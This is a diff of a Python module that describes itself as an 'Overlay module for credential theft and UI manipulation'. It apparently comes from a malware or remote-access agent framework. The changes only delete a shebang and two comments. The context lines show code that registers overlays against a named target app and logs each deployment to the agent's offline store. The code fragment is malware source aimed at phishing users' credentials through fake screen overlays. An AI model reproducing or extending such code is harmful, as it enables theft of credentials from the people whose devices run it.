@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+
 """
 Overlay module for credential theft and UI manipulation
 """
@@ -31,7 +31,7 @@ class OverlayModule:
             if not target_app:
                 return {"error": "target_app required"}
             
-            # Create overlay configuration
+
             overlay_config = {
                 "target": target_app,
                 "type": overlay_type,
@@ -42,7 +42,7 @@ class OverlayModule:
             overlay_id = f"{target_app}_{int(time.time())}"
             self.active_overlays[overlay_id] = overlay_config
             
-            # Log the deployment for offline storage
+
             self.agent.offline_logger.log_event("overlay_deployed", {
                 "overlay_id": overlay_id,
                 "target_app": target_app,
